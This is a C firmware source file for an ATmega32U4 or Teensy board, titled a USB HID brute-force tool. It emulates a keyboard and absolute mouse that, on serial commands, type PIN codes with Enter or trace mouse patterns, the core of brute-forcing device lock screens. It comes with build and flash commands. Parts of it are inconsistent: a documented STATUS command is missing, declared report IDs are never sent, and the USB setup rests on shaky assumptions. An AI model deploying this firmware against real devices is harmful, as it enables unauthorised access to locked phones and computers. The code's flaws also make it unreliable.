/**
 * Dragon Legion — USB HID Brute-Force Firmware (ATmega32U4 / Teensy 2.0).
 *
 * Implements keyboard + absolute mouse USB HID interfaces.
 * Controlled via serial at 115200 baud.
 *
 * Serial commands:
 *   PIN:1234            → Type PIN digits followed by Enter
 *   PATTERN:0,100,500   → Move mouse in pattern (x,y,delay_ms tuples)
 *   RESET               → Re-enumerate USB (force reconnection)
 *   STATUS              → Report firmware status
 *
 * Compile: avr-gcc -mmcu=atmega32u4 -DF_CPU=16000000UL -Os -o hid_attack.elf hid_attack.c
 * Flash:   avrdude -c usbtiny -p atmega32u4 -U flash:w:hid_attack.hex:i
 *
 * Board: Arduino Micro, Leonardo, Teensy 2.0, or any ATmega32U4 board.
 */

#include <avr/io.h>
#include <avr/interrupt.h>
#include <avr/pgmspace.h>
#include <avr/wdt.h>
#include <util/delay.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>

/* ------------------------------------------------------------------ */
/* USB HID constants                                                   */
/* ------------------------------------------------------------------ */

/* USB HID keyboard keycodes (Usage Page 0x07) */
#define KEY_A         0x04
#define KEY_B         0x05
#define KEY_C         0x06
#define KEY_D         0x07
#define KEY_E         0x08
#define KEY_F         0x09
#define KEY_G         0x0A
#define KEY_H         0x0B
#define KEY_I         0x0C
#define KEY_J         0x0D
#define KEY_K         0x0E
#define KEY_L         0x0F
#define KEY_M         0x10
#define KEY_N         0x11
#define KEY_O         0x12
#define KEY_P         0x13
#define KEY_Q         0x14
#define KEY_R         0x15
#define KEY_S         0x16
#define KEY_T         0x17
#define KEY_U         0x18
#define KEY_V         0x19
#define KEY_W         0x1A
#define KEY_X         0x1B
#define KEY_Y         0x1C
#define KEY_Z         0x1D
#define KEY_1         0x1E
#define KEY_2         0x1F
#define KEY_3         0x20
#define KEY_4         0x21
#define KEY_5         0x22
#define KEY_6         0x23
#define KEY_7         0x24
#define KEY_8         0x25
#define KEY_9         0x26
#define KEY_0         0x27
#define KEY_ENTER     0x28
#define KEY_ESC       0x29
#define KEY_BACKSPACE 0x2A
#define KEY_TAB       0x2B
#define KEY_SPACE     0x2C
#define KEY_DELETE    0x4C
#define KEY_RIGHT     0x4F
#define KEY_LEFT      0x50
#define KEY_DOWN      0x51
#define KEY_UP        0x52

/* HID Report IDs */
#define REPORT_ID_KEYBOARD  1
#define REPORT_ID_MOUSE     2

/* ------------------------------------------------------------------ */
/* Digit-to-keycode lookup table (in PROGMEM)                         */
/* ------------------------------------------------------------------ */

static const uint8_t digit_keycodes[10] PROGMEM = {
    KEY_0, KEY_1, KEY_2, KEY_3, KEY_4,
    KEY_5, KEY_6, KEY_7, KEY_8, KEY_9,
};

/* ------------------------------------------------------------------ */
/* USB HID Descriptors                                                 */
/* ------------------------------------------------------------------ */

/**
 * HID Report Descriptor — Keyboard + Absolute Mouse (Multi-Touch).
 *
 * Keyboard (Report ID 1): 8-byte report
 *   [modifier(1)][reserved(1)][keycode(6)]
 *
 * Absolute Mouse (Report ID 2): 7-byte report
 *   [buttons(1)][x_low(1)][x_high(1)][y_low(1)][y_high(1)][wheel(1)][pan(1)]
 */
static const uint8_t hid_report_descriptor[] PROGMEM = {
    /* Keyboard (Report ID 1) */
    0x05, 0x01,        /* Usage Page (Generic Desktop)                   */
    0x09, 0x06,        /* Usage (Keyboard)                               */
    0xA1, 0x01,        /* Collection (Application)                       */
    0x85, 0x01,        /*   Report ID (1)                                */
    0x05, 0x07,        /*   Usage Page (Keyboard/Keypad)                 */
    0x19, 0xE0,        /*   Usage Minimum (Keyboard LeftControl)         */
    0x29, 0xE7,        /*   Usage Maximum (Keyboard Right GUI)           */
    0x15, 0x00,        /*   Logical Minimum (0)                          */
    0x25, 0x01,        /*   Logical Maximum (1)                          */
    0x75, 0x01,        /*   Report Size (1)                              */
    0x95, 0x08,        /*   Report Count (8)                             */
    0x81, 0x02,        /*   Input (Data, Variable, Absolute)             */
    0x95, 0x01,        /*   Report Count (1)                             */
    0x75, 0x08,        /*   Report Size (8)                              */
    0x81, 0x01,        /*   Input (Constant)                             */
    0x95, 0x05,        /*   Report Count (5)                             */
    0x75, 0x01,        /*   Report Size (1)                              */
    0x05, 0x08,        /*   Usage Page (LEDs)                            */
    0x19, 0x01,        /*   Usage Minimum (Num Lock)                     */
    0x29, 0x05,        /*   Usage Maximum (Kana)                         */
    0x91, 0x02,        /*   Output (Data, Variable, Absolute)            */
    0x95, 0x01,        /*   Report Count (1)                             */
    0x75, 0x03,        /*   Report Size (3)                              */
    0x91, 0x01,        /*   Output (Constant)                            */
    0x95, 0x06,        /*   Report Count (6)                             */
    0x75, 0x08,        /*   Report Size (8)                              */
    0x15, 0x00,        /*   Logical Minimum (0)                          */
    0x25, 0x65,        /*   Logical Maximum (101)                        */
    0x05, 0x07,        /*   Usage Page (Keyboard/Keypad)                 */
    0x19, 0x00,        /*   Usage Minimum (Reserved)                     */
    0x29, 0x65,        /*   Usage Maximum (Keyboard Application)         */
    0x81, 0x00,        /*   Input (Data, Array)                          */
    0xC0,              /* End Collection                                 */

    /* Absolute Mouse / Multi-Touch (Report ID 2) */
    0x05, 0x01,        /* Usage Page (Generic Desktop)                   */
    0x09, 0x02,        /* Usage (Mouse)                                  */
    0xA1, 0x01,        /* Collection (Application)                       */
    0x85, 0x02,        /*   Report ID (2)                                */
    0x09, 0x01,        /*   Usage (Pointer)                              */
    0xA1, 0x00,        /*   Collection (Physical)                        */
    0x05, 0x09,        /*     Usage Page (Button)                        */
    0x19, 0x01,        /*     Usage Minimum (Button 1)                   */
    0x29, 0x03,        /*     Usage Maximum (Button 3)                   */
    0x15, 0x00,        /*     Logical Minimum (0)                        */
    0x25, 0x01,        /*     Logical Maximum (1)                        */
    0x75, 0x01,        /*     Report Size (1)                            */
    0x95, 0x03,        /*     Report Count (3)                           */
    0x81, 0x02,        /*     Input (Data, Variable, Absolute)           */
    0x95, 0x01,        /*     Report Count (1)                           */
    0x75, 0x05,        /*     Report Size (5)                            */
    0x81, 0x01,        /*     Input (Constant)                           */
    0x05, 0x01,        /*     Usage Page (Generic Desktop)               */
    0x09, 0x30,        /*     Usage (X)                                  */
    0x09, 0x31,        /*     Usage (Y)                                  */
    0x16, 0x01, 0x80,  /*     Logical Minimum (-32767)                   */
    0x26, 0xFF, 0x7F,  /*     Logical Maximum (32767)                    */
    0x75, 0x10,        /*     Report Size (16)                           */
    0x95, 0x02,        /*     Report Count (2)                           */
    0x81, 0x02,        /*     Input (Data, Variable, Absolute)           */
    0xC0,              /*   End Collection                               */
    0xC0,              /* End Collection                                 */
};

/* ------------------------------------------------------------------ */
/* USB device descriptors (simplified for ATmega32U4)                 */
/* ------------------------------------------------------------------ */

/* In production: this is handled by the LUFA library or Arduino core.
 * For bare-metal, define the full USB descriptor set.
 * Here we use the Arduino Micro bootloader which handles USB HID setup.
 */

/* ------------------------------------------------------------------ */
/* Serial command buffer                                               */
/* ------------------------------------------------------------------ */

#define SERIAL_BUF_SIZE 128
static char serial_buf[SERIAL_BUF_SIZE];
static uint8_t serial_pos = 0;

/* ------------------------------------------------------------------ */
/* Variable-delay using busy-wait loop (ATmega32U4 @ 16MHz)            */
/* 1ms = 16,000 cycles. Each loop iteration = ~4 cycles.               */
/* ------------------------------------------------------------------ */

static void delay_ms_variable(uint16_t ms) {
    while (ms--) {
        volatile uint16_t i;
        for (i = 0; i < 4000; i++) {
            __asm__ __volatile__("nop");
        }
    }
}

/* ------------------------------------------------------------------ */
/* USB HID Report sending (via Arduino USB HID library or raw EP)    */
/* ------------------------------------------------------------------ */

/* Keyboard report: 8 bytes */
static void hid_send_keyboard(uint8_t modifier, uint8_t keycode) {
    /* In production on bare-metal ATmega32U4:
     * Write 8-byte report to USB endpoint 1 (interrupt IN).
     * UEINTX waits for readiness, then write to UEDATX.
     *
     * For Arduino-compatible builds, use Keyboard.h:
     *   Keyboard.set_key1(keycode);
     *   Keyboard.set_modifier(modifier);
     *   Keyboard.send_now();
     */
    uint8_t report[8] = {modifier, 0, 0, 0, 0, 0, 0, 0};
    if (keycode) {
        report[2] = keycode;
    }

    /* Write to USB endpoint */
    UENUM = 1;  /* Select endpoint 1 */
    while (!(UEINTX & (1 << RWAL))); /* Wait for readiness */
    for (uint8_t i = 0; i < 8; i++) {
        UEDATX = report[i];
    }
    UEINTX &= ~(1 << TXINI); /* Send */
}

/* Mouse absolute report: 7 bytes */
static void hid_send_mouse_absolute(uint8_t buttons, int16_t x, int16_t y) {
    uint8_t report[7] = {
        buttons,
        (uint8_t)(x & 0xFF),
        (uint8_t)((x >> 8) & 0xFF),
        (uint8_t)(y & 0xFF),
        (uint8_t)((y >> 8) & 0xFF),
        0,  /* Wheel */
        0,  /* Pan */
    };

    UENUM = 2;  /* Select endpoint 2 */
    while (!(UEINTX & (1 << RWAL)));
    for (uint8_t i = 0; i < 7; i++) {
        UEDATX = report[i];
    }
    UEINTX &= ~(1 << TXINI);
}

/* ------------------------------------------------------------------ */
/* Key press/release sequence for a digit                             */
/* ------------------------------------------------------------------ */

static void type_digit(char digit, uint16_t delay_ms) {
    if (digit < '0' || digit > '9') return;

    uint8_t keycode = pgm_read_byte(&digit_keycodes[digit - '0']);

    /* Key press */
    hid_send_keyboard(0, keycode);
    delay_ms_variable(5);

    /* Key release */
    hid_send_keyboard(0, 0);
    delay_ms_variable(delay_ms);
}

static void type_enter(uint16_t delay_ms) {
    hid_send_keyboard(0, KEY_ENTER);
    delay_ms_variable(5);
    hid_send_keyboard(0, 0);
    delay_ms_variable(delay_ms);
}

static void type_pin(const char *pin, uint16_t inter_key_ms, uint16_t enter_ms) {
    uint8_t len = strlen(pin);
    for (uint8_t i = 0; i < len; i++) {
        type_digit(pin[i], inter_key_ms);
    }
    type_enter(enter_ms);
}

/* ------------------------------------------------------------------ */
/* USB reset — force device re-enumeration                             */
/* ------------------------------------------------------------------ */

static void usb_reset(void) {
    /* Disable USB, wait, re-enable */
    USBCON |= (1 << USBE);  /* Keep USB enabled */
    UDCON |= (1 << DETACH); /* Detach from bus */
    delay_ms_variable(500);
    UDCON &= ~(1 << DETACH); /* Re-attach */
}

/* ------------------------------------------------------------------ */
/* Serial command parser                                              */
/* ------------------------------------------------------------------ */

static void process_command(void) {
    /* PIN:1234 */
    if (strncmp(serial_buf, "PIN:", 4) == 0) {
        const char *pin = serial_buf + 4;
        type_pin(pin, 50, 100);
    }
    /* PATTERN:x1,y1,delay1,x2,y2,delay2,... */
    else if (strncmp(serial_buf, "PATTERN:", 8) == 0) {
        char *ptr = serial_buf + 8;
        char *token = strtok(ptr, ",");
        while (token) {
            int16_t x = (int16_t)atoi(token);
            token = strtok(NULL, ",");
            if (!token) break;
            int16_t y = (int16_t)atoi(token);
            token = strtok(NULL, ",");
            if (!token) break;
            uint16_t delay_ms = (uint16_t)atoi(token);

            hid_send_mouse_absolute(0, x, y);
            delay_ms_variable(delay_ms);

            token = strtok(NULL, ",");
        }
    }
    /* RESET */
    else if (strcmp(serial_buf, "RESET") == 0) {
        usb_reset();
    }
    /* DELAY:500 */
    else if (strncmp(serial_buf, "DELAY:", 6) == 0) {
        uint16_t ms = (uint16_t)atoi(serial_buf + 6);
        delay_ms_variable(ms);
    }
}

/* ------------------------------------------------------------------ */
/* Serial receive ISR (USART RX) — buffers command, main loop processes */
/* ------------------------------------------------------------------ */

static volatile uint8_t command_ready = 0;

ISR(USART1_RX_vect) {
    uint8_t ch = UDR1;

    if (ch == '\r' || ch == '\n') {
        if (serial_pos > 0) {
            serial_buf[serial_pos] = '\0';
            command_ready = 1;
            serial_pos = 0;
        }
    } else if (serial_pos < SERIAL_BUF_SIZE - 1) {
        serial_buf[serial_pos++] = (char)ch;
    }
}

/* ------------------------------------------------------------------ */
/* USART initialization                                                */
/* ------------------------------------------------------------------ */

static void usart_init(uint32_t baud) {
    uint16_t ubrr = (F_CPU / 16 / baud - 1);
    UBRR1H = (uint8_t)(ubrr >> 8);
    UBRR1L = (uint8_t)ubrr;
    UCSR1B = (1 << RXEN1) | (1 << TXEN1) | (1 << RXCIE1);  /* RX + TX + RX interrupt */
    UCSR1C = (1 << UCSZ11) | (1 << UCSZ10);  /* 8-bit, 1 stop bit, no parity */
}

/* ------------------------------------------------------------------ */
/* Main entry point                                                    */
/* ------------------------------------------------------------------ */

int main(void) {
    /* Disable watchdog */
    wdt_disable();

    /* Initialize USART at 115200 baud */
    usart_init(115200);

    /* Set up USB — handled by bootloader on reset.
     * The ATmega32U4's USB bootloader (Caterina/Teensy) starts the USB stack.
     * We just need to ensure endpoints are configured.
     */

    /* LED indicator on PB5 (Arduino pin 13) */
    DDRB |= (1 << PB5);
    PORTB |= (1 << PB5);  /* LED on = ready */

    /* Enable global interrupts */
    sei();

    /* Main loop — check for buffered commands */
    for (;;) {
        if (command_ready) {
            cli();
            process_command();
            command_ready = 0;
            sei();
        }
        /* Blink LED to show we're alive */
        PORTB ^= (1 << PB5);
        delay_ms_variable(500);
    }

    return 0;
}
